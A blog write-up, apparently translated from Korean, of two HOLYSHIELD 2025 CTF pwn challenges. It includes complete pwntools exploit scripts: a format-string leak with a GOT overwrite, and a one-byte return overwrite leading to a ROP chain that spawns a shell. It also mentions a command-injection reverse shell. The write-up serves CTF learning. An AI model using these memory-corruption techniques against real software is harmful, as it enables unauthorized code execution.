---
title: "HOLYSHIELD 2025 Writeup"
description: "A college junior contacted me to participate in the last CTF of undergraduate students, so I decided to just have fun, but the kids were sincere, so I participated while concentrating for the first time in a while... but I ended up getting on the bus unintentionally. There were a total of 3 problems in the PWN field. If you summarize the types, v8, rop, tapo 1-day reproduction? one problem"
date: "2025-12-28"
translation_key: "tistory-a9f7e62c938c"
tags: ["Write Up/CTF"]
category: "Write Up/CTF"
source_url: "https://whrdud727.tistory.com/entry/HOLYSHIELD-2025-Writeup"
private: false
---

A junior in college contacted me asking me to participate in the last CTF as an undergraduate student, so I decided to participate.

So I thought I should just have fun with them, but the kids were sincere, so I participated and focused for the first time in a while...

I ended up getting on the bus unintentionally.

* * *

There were a total of 3 problems in the PWN field. If you summarize the types, can you reproduce v8, rop, and tapo 1-day? It was a problem.

The competition was held from 09:00 to 18:00 in the morning, and during this time, we only focused on one problem.

It's not just me, my friends who participated in the competition all said that they were so busy solving this problem that they couldn't see the other problems.

The person who solved the most problems was the person who solved only one problem, but that was only one person.

* * *

### AVOTAPO

![](/assets/images/tistory/tistory-a9f7e62c938c/001.png)

The problem that most of the players who participated in the competition similar to mine had...

If you download the attached file, you can see that there are two paths.

The camera path contains files that build a web page, but since the IP and port provided are not web, you must look at the files in the chall path first.

![](/assets/images/tistory/tistory-a9f7e62c938c/002.png)

When the binary is executed, an ID value is input from the user.

At this time, it is checked whether the input value is the ‘happysmile’ string. At this time, there is no verification as to whether another string follows this string.

An fsb vulnerability occurs after string verification.

![](/assets/images/tistory/tistory-a9f7e62c938c/003.png)

In administrator(), subsequent actions are determined through a switch statement. At this time, if 2 comes in, pwn() can be executed.

![](/assets/images/tistory/tistory-a9f7e62c938c/004.png)

In pwn(), you can decide whether to overwrite only 1 byte or 8 bytes depending on the ck value.

Here, the ck value changes after performing one operation, but since it ends immediately afterwards, the function must be repeated more than twice.

First, you need to use the first vulnerability, fsb, to rescue canary, pie, libc, and stack.

Afterwards, you have to come to pwn(), modulate 1 byte of the stack ret, and run it again.

Afterwards, you can use 8 byte overwrite to get overwrite puts@got.

```
from pwn import *

target = b'./prob'

p = process(target)
p = remote("<target_ip>",<port>)
#p = remote('127.0.0.1',9000)
e = ELF(b'./libc.so.6')

passkey = b"happysmile "
passkey += b"%15$p "
passkey += b"%20$p "
passkey += b"%23$p "
passkey += b"%1$p "

p.sendlineafter(b"ID : ",passkey)
p.recvuntil(b"0x")

cny = int(p.recvn(16),16)
print("cny = ",hex(cny))

p.recvuntil(b"0x")
pie_base = int(p.recvn(12),16) - 0x33b0
print("pie_base = ",hex(pie_base))

p.recvuntil(b"0x")
libc_base = int(p.recvn(12),16) - 0x29d90
print("libc_base = ",hex(libc_base))

p.recvuntil(b"0x")
stack = int(p.recvn(12),16) +0x20f8 #- 0x28 #0x3a1
print("stack_addr =", hex(stack))

p.sendlineafter(b">> ",b"2")

puts_got = pie_base + 0x35c8 #e.got['puts']
print("puts_got = ",hex(puts_got))

p.recvuntil("pwn pwn!")

p.sendline(str(stack).encode())
p.sendline(str(0x30).encode())

p.sendlineafter(b">> ",b"2")

p.recvuntil("pwn pwn!")
p.sendline(str(puts_got).encode())
p.sendline(str(libc_base + 0xebc85).encode())

p.interactive()
```

After obtaining the shell from the first binary like this, you need to look at the internal log file.

There was a hint here about ffmpeg including a specific IP, but when I saw this, I wondered if I should select the flag as the media, but I didn't try it. I should have tried it...

To summarize the solution, the IP obtained here is a web server, and a command injection vulnerability exists here. Trigger a reverse shell here... and pull the video through ffmpeg, and that's it... I can't believe it was really this...

* * *

### Buffer\_One\_Flow

I couldn't solve this problem during the competition due to time constraints, but I tried to solve it after the competition ended.

In relation to this, the solver code and official writeup were uploaded one by one on the competition Discord and Git, but they do not work in my environment??

I even built and ran Docker, but it didn't work, so I just unpacked it again.

The problem code is really simple.

![](/assets/images/tistory/tistory-a9f7e62c938c/005.png)

This code is just the core code and can be considered the entire binary.

If you allocate a buffer of 16 bytes and think of 0x8 as sfp, 0x24, that is, 0x18, is up to sfp. Afterwards, only 1 byte of ret can be overwritten.

![](/assets/images/tistory/tistory-a9f7e62c938c/006.png)

You may wonder what you can do with just overwriting 1 byte, but there is more you can do than you think.

All vulnerable functions, from vuln() to main(), can be accessed by modifying just 1 byte.

There are too many things to first obtain in order to obtain the shell here.

![](/assets/images/tistory/tistory-a9f7e62c938c/007.png)

NX-Bit and PIE are activated and got overwrite is not possible.

Therefore, libc, pie, and stack must all be saved.

![](/assets/images/tistory/tistory-a9f7e62c938c/008.png)

When entering 0x19 byte, you can manipulate 1 byte and change ret to the starting address of main() or another function.

If you input 0x19 byte like that, ret will be output due to off-by-one.

Then, you can naturally find pie\_base.

Afterwards, by repeatedly using the stack created, fill 0x18 with one of \_start(), main(), and vuln(), and overwrite up to 1 byte several times, you can see a nice-looking structure in memory.

libc section address

dummy#1

dummy#2

pie section address

If you can manipulate sfp with dummy#2 using this section, you can obtain libc from vuln(), which outputs from rbp+0x10 (stack grows from high to low numbers!).

![](/assets/images/tistory/tistory-a9f7e62c938c/009.png)

To do this, you need to find the stack address. While outputting the stack address, it must be retred to one of main(), vuln(), or \_start() at the same time.

In this part, the stack was created as shown below in the section where data was repeatedly sent, so you can use this part.

![](/assets/images/tistory/tistory-a9f7e62c938c/010.png)

Once you have obtained everything, all you have to do is form a ROP chain and obtain a shell.

```
from pwn import*

target = b'./chall'

p = process(target)
e = ELF(target)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#context.log_level='debug'

payload = b'a'*0x18
payload += b'\x9a'

################## pie base leak ###############
p.send(payload)

p.recvuntil(b'a'*0x18)
pie_base = u64(p.recvn(6)+b'\x00\x00') - 0x000000000000119a

print("pie_base = ", hex(pie_base))

################## stack addr leak  #############
payload = p64(pie_base + 0x4110)
payload += p64(pie_base + 0x1080)*0x2
payload += b'\x9a'

for i in range(10):
    p.send(payload)

payload = p64(pie_base+0x1080)*0x3
payload += b'\x9a'
for i in range(10):
    p.send(payload)
payload = b'c'*0x10
pause()
p.send(payload)

p.recvuntil(b'c'*0x10)
stack = u64(p.recvn(6) + b'\x00'*2)
print("stack_addr = ", hex(stack))

################### libc base leak  ##############

payload = p64(pie_base + e.sym['main'])*2
payload += p64(stack-0xe8)
payload += b'\x8b'
p.send(payload)

p.recvn(8)
libc_base = u64(p.recvn(6)+b'\x00'*2) - 0x202030
print("libc_base = ",hex(libc_base))

#################################################

system = libc_base + libc.sym['system']
binsh = libc_base + list(libc.search("/bin/sh\x00"))[0]
p_rdi = libc_base + 0x000000000010f78b

print("system_addr = ",hex(system))
print("binsh_addr = ",hex(binsh))
print("p_rdi_adr = ",hex(p_rdi))

payload = b'a'*0x10
payload += p64(system)
payload += b'\x9a'
p.send(payload)

payload = b'b'*0x10
payload += p64(binsh)
payload += b'\x9a'
p.send(payload)

payload = b'c'*0x10
payload += p64(p_rdi)
payload += b'\x9a'
p.send(payload)

payload = b'd'*0x18
payload += p64(pie_base + 0x11b2)
p.send(payload)

p.interactive()
```

Hmm... It was simpler with the official list, but it doesn't work in my environment... so I tried this method...